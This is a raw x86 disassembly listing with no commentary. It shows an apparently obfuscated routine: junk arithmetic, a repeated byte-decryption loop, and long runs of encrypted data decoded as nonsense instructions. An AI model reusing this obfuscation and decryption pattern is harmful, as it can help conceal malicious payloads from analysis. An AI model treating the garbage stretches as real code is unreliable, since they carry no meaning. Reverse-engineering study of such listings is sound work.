  416547:	ins    BYTE PTR es:[edi],dx
  416548:	mov    ds:0x37762e58,eax
  41654d:	lahf   
  41654e:	lock push 0xc82b295e
  416554:	or     ecx,DWORD PTR [ecx+0x5537fa78]
  41655a:	jecxz  0x416548
  41655c:	int    0xc0
  41655e:	xor    eax,edi
  416560:	shr    eax,0x2
  416563:	or     ecx,eax
  416565:	push   ecx
  416566:	lea    eax,[ebp-0x2c]
  416569:	push   eax
  41656a:	mov    eax,DWORD PTR [ebp+0x10]
  41656d:	mov    ecx,DWORD PTR [ebp+0x14]
  416570:	shrd   eax,ecx,0x2
  416574:	shr    ecx,0x2
  416577:	mov    ecx,DWORD PTR [ebp+0x10]
  41657a:	mov    edx,DWORD PTR [ebp+0x14]
  41657d:	xor    edx,edx
  41657f:	shl    ecx,0x1e
  416582:	mov    ecx,DWORD PTR [ebp+0x10]
  416585:	xor    eax,esi
  416587:	or     eax,edx
  416589:	mov    edx,DWORD PTR [ebp+0x14]
  41658c:	shrd   ecx,edx,0x2
  416590:	shr    edx,0x2
  416593:	mov    edx,DWORD PTR [ebp+0x10]
  416596:	mov    ebx,DWORD PTR [ebp+0x14]
  416599:	xor    ecx,esi
  41659b:	xor    ebx,ebx
  41659d:	or     ecx,ebx
  41659f:	shl    edx,0x1e
  4165a2:	add    eax,ecx
  4165a4:	mov    ecx,DWORD PTR [ebp+0x10]
  4165a7:	mov    edx,DWORD PTR [ebp+0x14]
  4165aa:	shrd   ecx,edx,0x2
  4165ae:	shr    edx,0x2
  4165b1:	xor    ecx,esi
  4165b3:	mov    edx,DWORD PTR [ebp+0x10]
  4165b6:	mov    ebx,DWORD PTR [ebp+0x14]
  4165b9:	xor    ebx,ebx
  4165bb:	or     ecx,ebx
  4165bd:	add    eax,ecx
  4165bf:	lea    eax,[ebp+eax*4-0x78]
  4165c3:	push   eax
  4165c4:	shl    edx,0x1e
  4165c7:	call   0x415231
  4165cc:	mov    eax,DWORD PTR [ebp-0x7c]
  4165cf:	mov    ecx,DWORD PTR [ebp-0x7c]
  4165d2:	xor    eax,edi
  4165d4:	xor    ecx,0xfffffffe
  4165d7:	shr    eax,0x2
  4165da:	shl    ecx,0x1e
  4165dd:	or     ecx,eax
  4165df:	mov    DWORD PTR [ebp-0x7c],ecx
  4165e2:	lea    eax,[ebp-0x7c]
  4165e5:	push   eax
  4165e6:	mov    eax,DWORD PTR [ebp+0x10]
  4165e9:	mov    ecx,DWORD PTR [ebp+0x14]
  4165ec:	shrd   eax,ecx,0x2
  4165f0:	shr    ecx,0x2
  4165f3:	mov    ecx,DWORD PTR [ebp+0x10]
  4165f6:	mov    edx,DWORD PTR [ebp+0x14]
  4165f9:	xor    eax,esi
  4165fb:	xor    edx,edx
  4165fd:	or     eax,edx
  4165ff:	push   eax
  416600:	mov    eax,ds:0x422568
  416605:	mov    edi,0x4224ae
  41660a:	push   edi
  41660b:	push   DWORD PTR [eax]
  41660d:	shl    ecx,0x1e
  416610:	call   0x41e9f9
  416615:	lea    eax,[ebp-0x7c]
  416618:	push   eax
  416619:	mov    eax,DWORD PTR [ebp+0x10]
  41661c:	mov    ecx,DWORD PTR [ebp+0x14]
  41661f:	shrd   eax,ecx,0x2
  416623:	shr    ecx,0x2
  416626:	mov    ecx,DWORD PTR [ebp+0x10]
  416629:	mov    edx,DWORD PTR [ebp+0x14]
  41662c:	xor    eax,esi
  41662e:	xor    edx,edx
  416630:	or     eax,edx
  416632:	push   eax
  416633:	mov    eax,ds:0x422568
  416638:	push   edi
  416639:	push   DWORD PTR [eax]
  41663b:	shl    ecx,0x1e
  41663e:	call   0x41e9f9
  416643:	mov    eax,DWORD PTR [ebp-0x30]
  416646:	mov    eax,DWORD PTR [ebp-0x20]
  416649:	mov    edi,DWORD PTR [ebp-0x14]
  41664c:	mov    eax,DWORD PTR [ebp-0x24]
  41664f:	mov    ecx,edi
  416651:	mov    DWORD PTR [ebp-0x1c],eax
  416654:	rol    ecx,0x2
  416657:	mov    eax,0xa4069aae
  41665c:	xor    ecx,eax
  41665e:	cmp    ecx,eax
  416660:	je     0x416bfd
  416666:	mov    edx,0x1001
  41666b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41666e:	xor    eax,eax
  416670:	test   ecx,ecx
  416672:	je     0x41669d
  416678:	mov    bl,BYTE PTR [eax+edi*1]
  41667b:	mov    BYTE PTR [ebp-0x1],bl
  41667e:	movzx  ebx,BYTE PTR [ebp-0x1]
  416682:	sub    ebx,0xec
  416688:	mov    BYTE PTR [ebp-0x1],bl
  41668b:	ror    BYTE PTR [ebp-0x1],1
  41668e:	mov    bl,BYTE PTR [ebp-0x1]
  416691:	mov    BYTE PTR [eax+edi*1],bl
  416694:	inc    eax
  416695:	cmp    eax,ecx
  416697:	jb     0x416678
  41669d:	dec    edx
  41669e:	jne    0x41666b
  4166a4:	mov    eax,DWORD PTR [ebp+0x8]
  4166a7:	mov    ecx,DWORD PTR [ebp+0xc]
  4166aa:	shrd   eax,ecx,0x2
  4166ae:	shr    ecx,0x2
  4166b1:	mov    ecx,DWORD PTR [ebp+0x8]
  4166b4:	mov    edx,DWORD PTR [ebp+0xc]
  4166b7:	xor    eax,esi
  4166b9:	xor    edx,edx
  4166bb:	or     eax,edx
  4166bd:	push   0x1
  4166bf:	add    eax,edi
  4166c1:	push   eax
  4166c2:	lea    eax,[ebp-0x2]
  4166c5:	push   eax
  4166c6:	shl    ecx,0x1e
  4166c9:	call   0x415231
  4166ce:	mov    eax,DWORD PTR [ebp+0x10]
  4166d1:	mov    ecx,DWORD PTR [ebp+0x14]
  4166d4:	shrd   eax,ecx,0x2
  4166d8:	shr    ecx,0x2
  4166db:	mov    ecx,DWORD PTR [ebp+0x10]
  4166de:	mov    edx,DWORD PTR [ebp+0x14]
  4166e1:	xor    eax,esi
  4166e3:	xor    edx,edx
  4166e5:	or     eax,edx
  4166e7:	add    eax,edi
  4166e9:	push   0x1
  4166eb:	push   eax
  4166ec:	mov    eax,DWORD PTR [ebp+0x8]
  4166ef:	shl    ecx,0x1e
  4166f2:	mov    ecx,DWORD PTR [ebp+0xc]
  4166f5:	shrd   eax,ecx,0x2
  4166f9:	shr    ecx,0x2
  4166fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4166ff:	mov    edx,DWORD PTR [ebp+0xc]
  416702:	xor    eax,esi
  416704:	xor    edx,edx
  416706:	or     eax,edx
  416708:	add    eax,edi
  41670a:	push   eax
  41670b:	shl    ecx,0x1e
  41670e:	call   0x415231
  416713:	push   0x1
  416715:	jmp    0x416975
  41671a:	out    dx,eax
  41671b:	(bad)
  41671f:	mov    dl,0x2a
  416721:	dec    esi
  416722:	xchg   ebx,eax
  416723:	fistp  WORD PTR [ebp-0x421f8990]
  416729:	mov    al,0x77
  41672b:	cld    
  41672c:	push   ss
  41672d:	sbb    BYTE PTR [ebx+0x48181814],bl
  416733:	mov    al,ds:0xfd01ff31
  416739:	ret    0xc172
  41673c:	rcl    DWORD PTR [eax],cl
  41673e:	jl     0x4166f5
  416740:	sbb    esi,ebx
  416742:	adc    BYTE PTR [ebx+0x44],bh
  416745:	jno    0x4167c4
  416747:	cdq    
  416748:	paddb  mm5,QWORD PTR [edi-0x47]
  41674c:	lock (bad) 
  41674e:	repz jg 0x4167bd
  416751:	and    dh,BYTE PTR [esi+ebp*2+0x23fe29d6]
  416758:	sbb    bl,BYTE PTR [ecx+0x402bf53]
  41675e:	push   cs
  41675f:	aas    
  416760:	xchg   ebp,eax
  416761:	sub    BYTE PTR [ebx+0x67a444bb],dl
  416767:	ja     0x41671c
  416769:	ret    
  41676a:	fidiv  WORD PTR fs:[edx+0x6c2b8651]
  416771:	arpl   WORD PTR [edi+edx*8],cx
  416774:	adc    BYTE PTR [ebp+0x7b],ch
  416777:	aam    0xbd
  416779:	retf   0xef48
  41677c:	ins    BYTE PTR es:[edi],dx
  41677d:	mov    edi,0x1bf16c03
  416782:	pusha  
  416783:	and    edi,ecx
  416785:	jb     0x416781
  416787:	jl     0x416779
  416789:	inc    esi
  41678a:	push   ebp
  41678b:	jp     0x416783
  41678d:	mov    ebx,0x1e8add4f
  416792:	mov    ecx,0x571ed458
  416797:	jg     0x4167ca
  416799:	je     0x41673f
  41679b:	adc    DWORD PTR [edi+0x68],0xffffffd1
  41679f:	arpl   WORD PTR [ecx],bx
  4167a1:	adc    eax,0x6c3836ad
  4167a6:	pop    ss
  4167a7:	ror    ebx,0x5e
  4167aa:	push   ecx
  4167ab:	xor    al,0x21
  4167ad:	fidiv  DWORD PTR [eax-0x6d]
  4167b0:	and    ch,BYTE PTR [eax+0x7021dfba]
  4167b6:	add    DWORD PTR [eax-0x6e],0x36
  4167ba:	jle    0x4167d4
  4167bc:	in     al,dx
  4167bd:	add    BYTE PTR [edx+0x7f3b78a0],ch
  4167c3:	mov    ah,0x30
  4167c5:	ret    0x25a1
  4167c8:	push   0x36
  4167ca:	lock daa 
  4167cc:	rcr    BYTE PTR [edx],cl
  4167ce:	inc    esi
  4167cf:	adc    bh,BYTE PTR [esi-0x63a8e461]
  4167d5:	dec    esi
  4167d6:	inc    esi
  4167d7:	add    BYTE PTR [edi],0x84
  4167da:	leave  
  4167db:	adc    DWORD PTR [esi+0x19fd565f],0x96ef24e3
  4167e5:	(bad)  
  4167e7:	sbb    edi,ecx
  4167e9:	scas   eax,DWORD PTR es:[edi]
  4167ea:	pop    esp
  4167eb:	into   
  4167ec:	retf   0x9f77
  4167ef:	cmc    
  4167f0:	(bad)  
  4167f1:	sub    al,0xc9
  4167f3:	cmp    al,0x50
  4167f5:	or     BYTE PTR [ecx],dh
  4167f7:	cmp    BYTE PTR [ecx],cl
  4167f9:	lods   eax,DWORD PTR ds:[esi]
  4167fa:	gs sbb eax,0xb7d02507
  416800:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416801:	ds sahf 
  416803:	sti    
  416804:	mov    DWORD PTR [edi-0x66],edi
  416807:	test   eax,0x19568c72
  41680c:	leave  
  41680d:	(bad)  
  41680e:	pop    esi
  41680f:	push   es
  416810:	inc    esi
  416811:	test   DWORD PTR [ebx],eax
  416813:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416814:	pop    eax
  416815:	add    bh,ah
  416817:	bound  edx,QWORD PTR [esp+eax*8+0x393d912e]
  41681e:	pop    ds
  41681f:	ins    BYTE PTR es:[edi],dx
  416820:	mov    edx,0x460a18ae
  416825:	call   DWORD PTR [ecx]
  416827:	mov    bh,0xdf
  416829:	nop
  41682a:	shl    DWORD PTR [eax],cl
  41682c:	repnz mov eax,0xf3176b0b
  416832:	sbb    DWORD PTR [eax+0x3c185bcd],esp
  416838:	xchg   BYTE PTR [eax-0x79],ch
  41683b:	loop   0x4167f7
  41683d:	test   BYTE PTR [ebp+0x4f],ch
  416840:	pusha  
  416841:	push   eax
  416842:	outs   dx,DWORD PTR ds:[esi]
  416843:	push   eax
  416844:	sbb    BYTE PTR [eax],0x4e
  416847:	(bad)  
  416848:	fsub   QWORD PTR [ebp+0x28f4f143]
  41684e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41684f:	stos   DWORD PTR es:[edi],eax
  416850:	adc    BYTE PTR [eax],0xd2
  416853:	cld    
  416854:	add    eax,0x552f552c
  416859:	les    esi,FWORD PTR [ecx-0x6f70ff5a]
  41685f:	out    dx,al
  416860:	adc    esp,DWORD PTR [eax-0x7ebe3998]
  416866:	stc    
  416867:	xor    DWORD PTR [ebp-0x270b083b],0x152beeed
  416871:	call   0xf0691a7b
  416876:	jl     0x4168c0
  416878:	dec    ecx
  416879:	gs push es
  41687b:	out    dx,eax
  41687c:	push   cs
  41687d:	xor    bh,BYTE PTR [ebx+0x4d2d661]
  416883:	mov    esi,0xc664ed62
  416888:	test   BYTE PTR [ecx],bl
  41688a:	aam    0x4
  41688c:	and    eax,0xaa017142
  416891:	xchg   ebx,eax
  416892:	(bad)  
  416894:	outs   dx,BYTE PTR ds:[esi]
  416895:	sub    al,0x34
  416897:	push   es
  416898:	scas   al,BYTE PTR es:[edi]
  416899:	loopne 0x416833
  41689b:	jmp    FWORD PTR [ebx]
  41689d:	push   cs
  41689e:	jnp    0x4168b8
  4168a0:	xchg   edx,eax
  4168a1:	mov    esi,edx
  4168a3:	in     al,dx
  4168a4:	test   DWORD PTR [edi+0x3c],ebx
  4168a7:	scas   eax,DWORD PTR es:[edi]
  4168a8:	int3   
  4168a9:	nop
  4168aa:	in     eax,dx
  4168ab:	scas   eax,DWORD PTR es:[edi]
  4168ac:	pop    ds
  4168ad:	ins    DWORD PTR es:[edi],dx
  4168ae:	call   0x312e:0x975f7fbe
  4168b5:	ins    DWORD PTR es:[edi],dx
  4168b6:	pushf  
  4168b7:	sbb    bl,BYTE PTR [eax+0x7bbc508b]
  4168bd:	and    BYTE PTR [esp+ecx*2],bh
  4168c0:	inc    esi
  4168c1:	dec    edi
  4168c2:	lods   eax,DWORD PTR ds:[esi]
  4168c3:	cmp    eax,0x46c30a4e
  4168c8:	cwde   
  4168c9:	mov    eax,ds:0x36ae7df7
  4168ce:	ds cli 
  4168d0:	jecxz  0x416924
  4168d2:	inc    ebx
  4168d3:	(bad)  
  4168d4:	inc    ebx
  4168d5:	test   al,0xd6
  4168d7:	out    dx,al
  4168d8:	call   0x6afb:0xa5ea98e2
  4168df:	inc    ecx
  4168e0:	test   DWORD PTR [ecx],0x43db9163
  4168e6:	push   ebp
  4168e7:	(bad)  
  4168e8:	dec    ebp
  4168e9:	push   edi
  4168ea:	fistp  DWORD PTR [eax-0x94826c]
  4168f0:	mov    ds:0x3d1d607f,eax
  4168f5:	sub    edi,DWORD PTR [esi-0x333ec4a]
  4168fb:	ror    DWORD PTR [edi+0x44f08e24],1
  416901:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416902:	arpl   WORD PTR [esi],cx
  416904:	dec    ebp
  416905:	cmp    edx,DWORD PTR [eax]
  416907:	and    al,0xc0
  416909:	xlat   BYTE PTR ds:[ebx]
  41690a:	add    eax,0xed42feea
  41690f:	sub    al,BYTE PTR [edx+0x61e7d045]
  416915:	mov    WORD PTR [esi+0x3e21f11b],gs
  41691b:	loop   0x416935
  41691d:	daa    
  41691e:	loopne 0x416941
  416920:	cdq    
  416921:	mov    ss,WORD PTR [esi+0x1541a56d]
  416927:	test   DWORD PTR [edx],edx
  416929:	je     0x4169a8
  41692b:	ror    DWORD PTR [edx],cl
  41692d:	sbb    edi,DWORD PTR [esi+eax*8]
  416930:	add    cl,BYTE PTR [ecx]
  416932:	out    0x1c,eax
  416934:	(bad)  
  416936:	hlt    
  416937:	mov    edx,0x2f30fdb6
  41693c:	cmp    BYTE PTR [esp+ebx*2],al
  41693f:	inc    eax
  416940:	cmp    ebp,DWORD PTR [ebx-0x1a]
  416943:	scas   eax,DWORD PTR es:[edi]
  416944:	jmp    0x41690c
  416946:	in     eax,dx
  416947:	jne    0x416938
  416949:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41694a:	dec    edi
  41694b:	scas   eax,DWORD PTR es:[edi]
  41694c:	xor    DWORD PTR [ecx],ebp
  41694e:	mov    al,ss:0x3dc1a31c
  416954:	mov    edi,edx
  416956:	mov    edx,DWORD PTR [ecx-0x265bd686]
  41695c:	push   ebx
  41695d:	ret    
  41695e:	jno    0x416942
  416960:	push   ebp
  416961:	xor    al,BYTE PTR [eax]
  416963:	adc    edi,ebx
  416965:	sbb    DWORD PTR [edx-0x2c],0x26
  416969:	in     al,0xcd
  41696b:	fmul   st(7),st
  41696d:	jecxz  0x4169e4
  41696f:	xadd   BYTE PTR [edi-0x72820153],bh
  416976:	inc    ebp
  416977:	(bad)  
  416978:	push   eax
  416979:	mov    eax,DWORD PTR [ebp+0x10]
  41697c:	mov    ecx,DWORD PTR [ebp+0x14]
  41697f:	shrd   eax,ecx,0x2
  416983:	shr    ecx,0x2
  416986:	mov    ecx,DWORD PTR [ebp+0x10]
  416989:	mov    edx,DWORD PTR [ebp+0x14]
  41698c:	xor    eax,esi
  41698e:	jmp    0x416bee
  416993:	mov    eax,0x2c1e900d
  416998:	sbb    ah,BYTE PTR [esi-0xf757786]
  41699e:	mov    esi,0xb07d2a41
  4169a3:	stc    
  4169a4:	clc    
  4169a5:	push   ss
  4169a6:	sbb    BYTE PTR [ebx-0x1ee7e7ec],bl
  4169ac:	xchg   ebx,eax
  4169ad:	lahf   
  4169ae:	das    
  4169af:	xor    DWORD PTR [edi],esi
  4169b1:	aas    
  4169b2:	je     0x4169ee
  4169b4:	mov    bl,BYTE PTR [edi]
  4169b6:	push   ebp
  4169b7:	pushf  
  4169b8:	shl    esi,1
  4169ba:	fwait
  4169bb:	imul   eax,DWORD PTR [edx-0x44ec2336],0x4c
  4169c2:	ret    
  4169c3:	mov    ds:0xd76fa9d8,al
  4169c8:	cmp    al,0x49
  4169ca:	ins    BYTE PTR es:[edi],dx
  4169cb:	mov    bh,0xca
  4169cd:	gs push ds
  4169cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169d0:	dec    ebx
  4169d1:	mov    dl,0xa4
  4169d3:	std    
  4169d4:	int3   
  4169d5:	addr16 xchg esp,eax
  4169d7:	scas   al,BYTE PTR es:[edi]
  4169d8:	je     0x4169a4
  4169da:	mov    al,ds:0xe111cbd2
  4169df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169e0:	push   edx
  4169e1:	mov    al,0x9d
  4169e3:	rcr    DWORD PTR [ebp-0x562cee0f],0x5c
  4169ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169eb:	inc    ecx
  4169ec:	inc    esi
  4169ed:	jno    0x416a50
  4169ef:	popa   
  4169f0:	mov    edx,DWORD PTR es:[eax-0x137b5ca9]
  4169f7:	cmp    eax,0x3ab58a23
  4169fc:	push   cs
  4169fd:	jecxz  0x416a16
  4169ff:	icebp  
  416a00:	loop   0x4169b1
  416a02:	jmp    0x416a41
  416a04:	pusha  
  416a05:	rol    BYTE PTR [ebx-0x21],0x24
  416a09:	jne    0x416a64
  416a0b:	lea    ecx,[ebx+0x69132977]
  416a11:	and    eax,0xa2fd84a6
  416a16:	mov    edx,0x22ad27ee
  416a1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a1c:	int    0xc8
  416a1e:	neg    DWORD PTR [esi-0x38f5b4a6]
  416a24:	xlat   BYTE PTR ds:[ebx]
  416a25:	inc    edx
  416a26:	adc    al,bl
  416a28:	xchg   edx,eax
  416a29:	sbb    ebp,DWORD PTR ds:0xd306472b
  416a2f:	stc    
  416a30:	js     0x4169f3
  416a32:	sub    eax,0x671d86e1
  416a37:	test   dh,cl
  416a39:	push   0xce5bf610
  416a3e:	jl     0x416ab0
  416a40:	push   ecx
  416a41:	scas   eax,DWORD PTR es:[edi]
  416a42:	in     eax,dx
  416a43:	(bad)  
  416a44:	sub    al,0xad
  416a46:	push   edx
  416a47:	mov    bl,0xa3
  416a49:	mov    ebp,fs
  416a4b:	rol    dh,1
  416a4d:	je     0x4169dc
  416a4f:	xlat   BYTE PTR ds:[ebx]
  416a50:	imul   ebx,DWORD PTR [ebp-0x977c402],0xffffffdf
  416a57:	xor    eax,DWORD PTR [ebp-0x13]
  416a5a:	jge    0x416a80
  416a5c:	aas    
  416a5d:	xor    esp,DWORD PTR [ecx]
  416a5f:	(bad)  
  416a60:	xchg   ecx,eax
  416a61:	stc    
  416a62:	jb     0x416ae3
  416a64:	jmp    0xa7fe53f2
  416a69:	mov    esi,DWORD PTR [edi+0x106a5fa6]
  416a6f:	xchg   ebx,eax
  416a70:	sub    al,0x2c
  416a72:	fidivr DWORD PTR [ebx+0x39a97900]
  416a78:	jmp    0x416a62
  416a7a:	data16 jp 0x416af7
  416a7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a7e:	inc    edi
  416a7f:	jle    0x416a0c
  416a81:	or     bl,BYTE PTR [eax]
  416a83:	ins    DWORD PTR es:[edi],dx
  416a84:	fadd   QWORD PTR [ecx]
  416a86:	jae    0x416a63
  416a88:	into   
  416a89:	scas   eax,DWORD PTR es:[edi]
  416a8a:	out    0xd1,al
  416a8c:	push   ebp
  416a8d:	sbb    ecx,DWORD PTR [edi-0x6907ad4]
  416a93:	push   edi
  416a94:	les    ebp,FWORD PTR [ebx]
  416a96:	and    DWORD PTR [edx+edi*1],ebp
  416a99:	dec    ecx
  416a9a:	pop    esi
  416a9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a9c:	jae    0x416abf
  416a9e:	paddusw mm6,QWORD PTR [ecx+0x1dfc8716]
  416aa5:	out    0xfd,eax
  416aa7:	sub    al,0x38
  416aa9:	or     bh,dh
  416aab:	popf   
  416aac:	bound  esp,QWORD PTR [ecx-0x7194a13b]
  416ab2:	push   ss
  416ab3:	fisub  DWORD PTR [ebx]
  416ab5:	mov    ds:0x8c45d781,al
  416aba:	(bad)  
  416abb:	mov    WORD PTR [ecx-0x27],ds
  416abe:	xchg   edx,eax
  416abf:	je     0x416b06
  416ac1:	out    0xc1,al
  416ac3:	fisub  WORD PTR [ecx-0x30]
  416ac6:	jnp    0x416a8b
  416ac8:	lea    ebx,[ecx-0x320c6ae6]
  416ace:	pop    esi
  416acf:	scas   eax,DWORD PTR es:[edi]
  416ad0:	xchg   esi,eax
  416ad1:	outs   dx,DWORD PTR ds:[esi]
  416ad2:	sub    dl,BYTE PTR [ebx]
  416ad4:	mov    ds:0x1a633021,al
  416ad9:	idiv   DWORD PTR [esp+esi*2+0xf]
  416add:	mov    eax,DWORD PTR [ebx]
  416adf:	pop    esi
  416ae0:	jnp    0x416b32
  416ae2:	loope  0x416ac3
  416ae4:	add    al,0x66
  416ae6:	or     al,0x1b
  416ae8:	add    eax,0x38ea85b2
  416aed:	add    al,0x29
  416aef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416af0:	xor    DWORD PTR [edi+eiz*1-0x5],esi
  416af4:	xor    DWORD PTR [eax+ecx*1-0xd],ecx
  416af8:	arpl   WORD PTR [edx-0x4c],cx
  416afb:	xchg   esi,eax
  416afc:	cwde   
  416afd:	outs   dx,BYTE PTR ds:[esi]
  416afe:	sbb    DWORD PTR [esi],edi
  416b00:	sub    edx,eax
  416b02:	jg     0x416b4e
  416b04:	xor    eax,0x56d21f9e
  416b09:	xchg   edx,eax
  416b0a:	fbstp  TBYTE PTR [eax-0x2ec6c814]
  416b10:	dec    edx
  416b11:	and    dh,BYTE PTR [ebx+0x79]
  416b14:	adc    DWORD PTR [eax+0x69],esp
  416b17:	cld    
  416b18:	push   es
  416b19:	test   al,0x41
  416b1b:	sbb    eax,0xa38240c
  416b20:	xchg   ecx,eax
  416b21:	imul   ebx,DWORD PTR [ecx],0xa8e0fea
  416b27:	inc    ebx
  416b28:	mov    ds:0x7ffc4a88,eax
  416b2d:	es jnp 0x416ab5
  416b30:	and    BYTE PTR [eax-0x5],dh
  416b33:	int    0xcb
  416b35:	int    0x9f
  416b37:	in     al,dx
  416b38:	push   eax
  416b39:	(bad)  
  416b3a:	mov    edi,0x7d836c84
  416b3f:	push   esi
  416b40:	in     al,dx
  416b41:	adc    al,0xa
  416b43:	das    
  416b44:	cmp    eax,0x3fcb55a8
  416b49:	dec    edx
  416b4a:	jno    0x416b62
  416b4c:	mov    eax,0xb904b039
  416b51:	dec    edx
  416b52:	push   ebp
  416b53:	ins    BYTE PTR es:[edi],dx
  416b54:	or     bh,BYTE PTR [edi]
  416b56:	cmc    
  416b57:	inc    eax
  416b58:	and    ecx,0xffffffc8
  416b5b:	mov    bh,0x61
  416b5d:	jns    0x416bc5
  416b5f:	fucom  st(3)
  416b61:	inc    ebp
  416b62:	and    DWORD PTR [ebp+0x33dea07],ecx
  416b68:	fwait
  416b69:	mov    ds:0xbb300a15,al
  416b6f:	mov    esp,DWORD PTR [ebx+eiz*2+0x3]
  416b73:	push   0x3c
  416b75:	out    dx,eax
  416b76:	jae    0x416bed
  416b78:	popa   
  416b79:	loopne 0x416b6f
  416b7b:	out    0x85,eax
  416b7d:	stos   DWORD PTR es:[edi],eax
  416b7e:	imul   ebx,DWORD PTR [ebp+edi*1+0x65ff26fe],0x81634d07
  416b89:	lods   al,BYTE PTR ds:[esi]
  416b8a:	loope  0x416b84
  416b8c:	xchg   ebp,eax
  416b8d:	mov    al,0x28
  416b8f:	jbe    0x416c07
  416b91:	jle    0x416b39
  416b93:	ins    DWORD PTR es:[edi],dx
  416b94:	push   ebp
  416b95:	pushf  
  416b96:	clc    
  416b97:	add    al,0x91
  416b99:	imul   edx,DWORD PTR [esi-0x65],0x21d0cc3e
  416ba0:	sub    al,0x65
  416ba2:	and    eax,0xea143ef2
  416ba7:	fiadd  WORD PTR [ebp-0x61]
  416baa:	out    dx,eax
  416bab:	xchg   DWORD PTR [ebx+edx*8],edx
  416bae:	test   ah,ch
  416bb0:	push   ss
  416bb1:	test   ebp,edx
  416bb3:	push   esp
  416bb4:	push   0x5e
  416bb6:	mov    ebx,0x1a82517a
  416bbb:	cmp    esi,DWORD PTR [ebp+0x72]
  416bbe:	pusha  
  416bbf:	loopne 0x416be6
  416bc1:	push   esp
  416bc2:	or     eax,0x681035f0
  416bc7:	xchg   ecx,eax
  416bc8:	and    eax,0x22a35d4b
  416bcd:	jmp    0x416b62
  416bcf:	pop    es
  416bd0:	inc    ebp
  416bd1:	or     eax,0x7e5e775e
  416bd6:	cmp    esi,DWORD PTR [ebx+ebx*4+0x75]
  416bda:	mov    esi,0x4f70fed6
  416bdf:	aaa    
  416be0:	jo     0x416b6b
  416be2:	pop    ss
  416be3:	fwait
  416be4:	not    BYTE PTR [ecx]
  416be6:	sahf   
  416be7:	mov    bh,0x24
  416be9:	test   al,0x5c
  416beb:	cmc    
  416bec:	add    DWORD PTR [ebp-0x3df42dcd],0xc150c703
  416bf6:	loope  0x416c16
  416bf8:	call   0x415231
  416bfd:	mov    eax,DWORD PTR [ebp+0x10]
  416c00:	mov    ecx,DWORD PTR [ebp+0x14]
  416c03:	shrd   eax,ecx,0x2
  416c07:	shr    ecx,0x2
  416c0a:	mov    ecx,DWORD PTR [ebp+0x10]
  416c0d:	mov    edx,DWORD PTR [ebp+0x14]
  416c10:	pop    edi
  416c11:	xor    eax,esi
  416c13:	xor    edx,edx
  416c15:	pop    esi
  416c16:	shl    ecx,0x1e
  416c19:	or     eax,edx
  416c1b:	pop    ebx
  416c1c:	leave  
  416c1d:	ret    0x10
  416c20:	or     eax,eax
  416c22:	mov    eax,DWORD PTR [esp+0x8]
  416c26:	sub    ecx,0x3e9e
  416c2c:	mov    ecx,DWORD PTR [esp+0x10]
  416c30:	or     ecx,eax
  416c32:	mov    DWORD PTR ds:0x42822f,ecx
  416c38:	mov    ecx,DWORD PTR [esp+0xc]
  416c3c:	jne    0x416c55
  416c42:	mov    eax,DWORD PTR [esp+0x4]
  416c46:	xor    DWORD PTR ds:0x42835b,0x1fc6
  416c50:	mul    ecx
  416c52:	ret    0x10
  416c55:	sub    DWORD PTR ds:0x42820b,0x3993
  416c5f:	push   ebx
  416c60:	sbb    DWORD PTR ds:0x428283,0x3efd
  416c6a:	mul    ecx
  416c6c:	add    DWORD PTR ds:0x4282e3,0x5330
  416c76:	mov    ebx,eax
  416c78:	xor    eax,eax
  416c7a:	add    eax,DWORD PTR ds:0x4281cb
  416c80:	mov    eax,DWORD PTR [eax]
  416c82:	adc    DWORD PTR ds:0x42820f,eax
  416c88:	mov    eax,DWORD PTR [esp+0x8]
  416c8c:	mul    DWORD PTR [esp+0x14]
  416c90:	add    ebx,eax
  416c92:	mov    eax,DWORD PTR [esp+0x8]
  416c96:	mul    ecx
  416c98:	add    edx,ebx
  416c9a:	pop    ebx
  416c9b:	ret    0x10
  416c9e:	push   ebp
  416c9f:	mov    ebp,esp
  416ca1:	sub    esp,0x44
  416ca4:	push   ebx
  416ca5:	push   esi
  416ca6:	push   edi
  416ca7:	mov    DWORD PTR [ebp-0x18],0x2
  416cae:	mov    DWORD PTR [ebp-0x14],0x29f0
  416cb5:	mov    DWORD PTR [ebp-0x10],0x3716
  416cbc:	mov    DWORD PTR [ebp-0x2c],0x4e09
  416cc3:	mov    DWORD PTR [ebp-0x28],0x4497
  416cca:	mov    DWORD PTR [ebp-0x24],0x5
  416cd1:	mov    DWORD PTR [ebp-0x20],0x2a0a
  416cd8:	mov    DWORD PTR [ebp-0x1c],0x1
  416cdf:	mov    DWORD PTR [ebp-0xc],0xce6
  416ce6:	mov    DWORD PTR [ebp-0x8],0x12b3
  416ced:	mov    DWORD PTR [ebp-0x4],0xb09
  416cf4:	mov    DWORD PTR [ebp-0x44],0x7617
  416cfb:	mov    DWORD PTR [ebp-0x40],0x721a
  416d02:	mov    DWORD PTR [ebp-0x3c],0x5151
  416d09:	mov    DWORD PTR [ebp-0x38],0x14aa
  416d10:	mov    DWORD PTR [ebp-0x34],0x5a28
  416d17:	mov    DWORD PTR [ebp-0x30],0x19a8
  416d1e:	mov    ecx,DWORD PTR [ebp-0x1c]
  416d21:	mov    eax,DWORD PTR [ebp-0x20]
  416d24:	xor    edx,edx
  416d26:	div    ecx
  416d28:	mov    ecx,DWORD PTR [ebp-0x24]
  416d2b:	xor    edx,edx
  416d2d:	mov    esi,0x1ac5
  416d32:	push   0x20
  416d34:	div    ecx
  416d36:	mov    ecx,DWORD PTR [ebp-0x28]
  416d39:	xor    edx,edx
  416d3b:	xor    eax,0x60dc
  416d40:	sub    eax,ecx
  416d42:	mov    ecx,DWORD PTR [ebp-0x2c]
  416d45:	lea    edi,[eax+ecx*1-0x6300]
  416d4c:	mov    eax,DWORD PTR [ebp-0x4]
